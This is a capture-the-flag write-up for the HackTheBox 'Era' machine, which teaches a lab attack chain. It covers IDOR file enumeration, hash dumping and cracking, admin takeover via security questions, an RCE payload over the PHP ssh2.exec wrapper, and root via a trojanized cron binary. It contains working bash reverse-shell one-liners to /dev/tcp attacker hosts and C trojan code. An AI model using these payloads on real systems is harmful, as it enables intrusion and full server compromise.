# ERA HTB Writeup | HackTheBox | Season 8

**Platform:** HackTheBox  
**Difficulty:** Intermediate  
**Focus:** Enumeration, IDOR, SSRF, FTP Exploitation, Privilege Escalation

---

## 📌 Overview
The *Era* machine demonstrates a multi-stage attack chain involving enumeration, IDOR, SSRF (via PHP stream wrappers), and privilege escalation through a group-writable binary executed by a scheduled task. The steps below reproduce the full path from initial discovery to root compromise.

---

## 🔍 Step 1: Enumeration

Initial port scanning with Nmap:

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ nmap -sVCT -Pn --min-rate 5000 -p- 10.10.11.79
```

**Findings:**
```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.5
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Era Designs
|_http-server-header: nginx/1.18.0 (Ubuntu)
```

Notes:
- FTP (vsftpd) and HTTP (nginx) are reachable. The HTTP service hosts `era.htb` and a virtual host `file.era.htb` discovered during vhost enumeration.

---

## 🌐 Step 2: Subdomain / Virtual Host Enumeration

Virtual host fuzzing using `ffuf`:

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ ffuf -w /usr/share/amass/wordlists/bitquark_subdomains_top100K.txt -H "Host: FUZZ.era.htb" -u http://era.htb -mc 200
```

**Finding:**
```
file                    [Status: 200, Size: 6765, Words: 2608, Lines: 234]
```

This reveals `file.era.htb` which contains a file download/management application.

---

## 👤 Step 3: Register User and File Download IDOR

Register a low-privileged user on `file.era.htb` (e.g., `yuri`). After registering, fuzz the download endpoint for valid file IDs to locate downloadable backups:

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ seq 0 1000 > id.txt
[root@kali] :/home/thanatos/Desktop/htb/machines$ ffuf -u http://file.era.htb/download.php?id=FUZZ -w id.txt -H "Cookie: PHPSESSID=YOUR_SESSION_COOKIE" -mc 200
```

**Finding:**  
- Valid file ID: **54** — corresponds to a site backup zip: `site-backup-30-08-24.zip`.

---

## 🧩 Step 4: Analyzing the SQLite Database

Unzip the backup and inspect the files. (Output captured during extraction)

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ unzip site-backup-30-08-24.zip
```

Example unzip output (truncated for clarity):
```
Archive:  site-backup-30-08-24.zip
  inflating: LICENSE
  inflating: bg.jpg
   creating: css/
  inflating: css/main.css.save
  inflating: css/main.css
  inflating: css/fontawesome-all.min.css
  inflating: css/noscript.css
   creating: css/./images/
 extracting: css/./images/overlay.png
  inflating: download.php
  inflating: filedb.sqlite
   creating: files/
  inflating: files/.htaccess
 extracting: files/index.php
  inflating: functions.global.php
  inflating: index.php
  inflating: initial_layout.php
  inflating: layout.php
  inflating: layout_login.php
  inflating: login.php
  inflating: logout.php
  inflating: main.png
  inflating: manage.php
  inflating: register.php
  inflating: reset.php
  inflating: security_login.php
  inflating: upload.php
   creating: webfonts/
  inflating: webfonts/fa-solid-900.eot
  inflating: webfonts/fa-regular-400.ttf
  inflating: webfonts/fa-regular-400.woff
  inflating: webfonts/fa-solid-900.svg
  inflating: webfonts/fa-solid-900.ttf
  inflating: webfonts/fa-solid-900.woff
  inflating: webfonts/fa-brands-400.ttf
 extracting: webfonts/fa-regular-400.woff2
  inflating: webfonts/fa-solid-900.woff2
  inflating: webfonts/fa-regular-400.eot
  inflating: webfonts/fa-regular-400.svg
  inflating: webfonts/fa-brands-400.woff2
  inflating: webfonts/fa-brands-400.woff
  inflating: webfonts/fa-brands-400.eot
  inflating: webfonts/fa-brands-400.svg
```

Open the SQLite DB and dump users and password hashes:

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ sqlite3 filedb.sqlite
sqlite> SELECT user_name, user_password FROM users;
```

**Dumped hashes** (copied directly):
```
admin_ef01cab31aa:$2y$10$wDbohsUaezf74d3sMNRPi.o93wDxJqphM2m0VVUp41If6WrYr.QPC
eric:$2y$10$S9EOSDqF1RzNUvyVj7OtJ.mskgP1spN3g2dneU.D.ABQLhSV2Qvxm
veronica:$2y$10$xQmS7JL8UT4B3jAYK7jsNeZ4I.YqaFFnZNA/2GCxLveQ805kuQGOK
yuri:$2b$12$HkRKUdjjOdf2WuTXovkHIOXwVDfSrgCqqHPpE37uWejRqUWqwEL2.
john:$2a$10$iccCEz6.5.W2p7CSBOr3ReaOqyNmINMH1LaqeQaL22a1T1V/IddE6
ethan:$2a$10$PkV/LAd07ftxVzBHhrpgcOwD3G1omX4Dk2Y56Tv9DpuUV/dh/a1wC
```

---

## 🔐 Step 5: Cracking Password Hashes

Use `hashcat` (example) with RockYou to attempt cracking:

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt --show
```

**Cracked credentials (examples):**
```
eric : america
yuri : mustang
```

> Store cracked credentials securely; these provide initial access paths to the web application and later to the system via SSRF/RCE chain.

---

## 🧠 Step 6: Updating Admin Security Questions via Authenticated User

Key insight: The app contains an *Update Security Questions* feature that allows a logged-in user to set security questions for *any* username. We use this to takeover the admin account.

1. Login as the low-privileged user:
```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ # login as yuri (via web form)
# yuri : mustang
```

2. Navigate to **Update Security Questions** and target the admin user:
```
Target username: admin_ef01cab31aa
```

3. Replace the admin security questions/answers, then use the reset feature to set a new password. Login as admin once reset is complete.

---

## 💣 Step 7: Exploiting IDOR + SSRF via PHP Stream Wrappers (RCE)

After authenticating as **admin_ef01cab31aa**, the `download.php` endpoint exposes a `format` parameter which accepts PHP stream wrappers. This can be abused to execute commands on the server via `ssh2.exec://` wrapper pointing to `127.0.0.1` and providing credentials of a local user (`eric:america`).

**RCE payload (use your attacker IP in place of `10.10.X.X`):**

```text
http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.X.X/4444%200>%261';%20
```

Trigger it from your machine (example via curl):

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ curl "http://file.era.htb/download.php?id=54&show=true&format=ssh2.exec://eric:america@127.0.0.1/bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/10.10.X.X/4444%200>%261';%20"
```

Start a netcat listener before triggering:

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ nc -lvnp 4444
```

Once the shell pops, retrieve the user flag:

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ cat user.txt
```

*(Replace `10.10.X.X` above with your attack machine IP to receive the reverse shell connection.)*

---

## 🪜 Step 8: Privilege Escalation via Group-Writable Binary (CRON-triggered)

While enumerating the system as `eric`, we find a scheduled monitoring binary that is:

- Owned by `root`
- Group-owned by `devs`
- Group-writable, and `eric` is a member of `devs`

**Discovery (example):**

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ ls -l /opt/AV/periodic-checks/monitor
# -rwxrwxr-x 1 root devs ... /opt/AV/periodic-checks/monitor
```

**Additional evidence from logs:**

- `CRON -f -P`: scheduled task daemon shows that a scheduled task was triggered.
- `bash -c echo > /opt/AV/periodic-checks/status.log`: the scheduled task cleared a log file.
- `objcopy --dump-section .text_sig=... /opt/AV/periodic-checks/monitor`: the binary had a `.text_sig` section dumped (used for verification).
- A script `/root/initiate_monitoring.sh` is invoked multiple times concurrently (multiple PIDs), indicating cron invokes the monitoring binary frequently.

**Exploit approach:** replace the `monitor` executable with a trojan that preserves expected signature section `.text_sig`. Steps performed as `eric` (on the target):

1. Create a small C program that spawns a reverse shell:
```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ cat abc.c
#include <stdlib.h>
int main() {
    system("/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.3/4444 0>&1'");
    return 0;
}
```

2. Compile it on the target:
```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ gcc abc.c -o backdoor
```

3. Extract the `.text_sig` section from the legitimate `monitor` binary (so the signature can be attached to our backdoor):
```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor
```

4. Add the extracted `.text_sig` section to the compiled backdoor:
```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ objcopy --add-section .text_sig=text_sig backdoor
```

5. Replace the original `monitor` with our backdoor and make it executable:
```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ cp backdoor /opt/AV/periodic-checks/monitor
[root@kali] :/home/thanatos/Desktop/htb/machines$ chmod +x /opt/AV/periodic-checks/monitor
```

Because cron runs `/root/initiate_monitoring.sh` which in turn executes `/opt/AV/periodic-checks/monitor` as root, the trojan will be executed with root privileges — resulting in a root shell on the attacker's listener.

**Files observed in `/opt/AV/periodic-checks/` during exploitation:**

```
a.c  backdoor  monitor  monitor_text_sig.bin  shell.c  status.log  text_sig
```

**Quick recap of important commands used during escalation:**

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ objcopy --dump-section .text_sig=text_sig /opt/AV/periodic-checks/monitor
[root@kali] :/home/thanatos/Desktop/htb/machines$ objcopy --add-section .text_sig=text_sig backdoor
[root@kali] :/home/thanatos/Desktop/htb/machines$ cp backdoor /opt/AV/periodic-checks/monitor
[root@kali] :/home/thanatos/Desktop/htb/machines$ chmod +x /opt/AV/periodic-checks/monitor
```

---

## 🏁 Root Proof
Once the cron job triggers the trojanized `monitor`, the reverse shell connects and a root shell can be obtained. Proof of root:

```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ cat /root/root.txt
```

---

## 📌 Post-Exploitation Notes
- Upgrade shells to an interactive TTY if needed:
```bash
[root@kali] :/home/thanatos/Desktop/htb/machines$ python3 -c 'import pty; pty.spawn("/bin/bash")'
[root@kali] :/home/thanatos/Desktop/htb/machines$ export TERM=xterm
```

- Be cautious with leaving files or backdoors on the box; remove any artifacts if the rules require it.
- Always document the steps taken and evidence captured for reporting.

---

## 📌 Lessons Learned
- Unvalidated `format` parameter allowed the use of PHP stream wrappers (`ssh2.exec`) leading to SSRF/RCE.
- Insecure direct object references (IDOR) allowed discovery and download of sensitive backups.
- Group-writable privileged binaries combined with scheduled execution (cron) are a common vector for privilege escalation.

---

## Appendix: Important Artifacts & Credentials
- Cracked creds: `eric : america`, `yuri : mustang`
- Downloadable backup ID: `54` → `site-backup-30-08-24.zip`
- Critical files extracted from backup: `filedb.sqlite`, `download.php`, `manage.php`, `security_login.php`, `upload.php`, etc.
- Privilege escalation target: `/opt/AV/periodic-checks/monitor` (group-writable, executed by scheduled task)

---
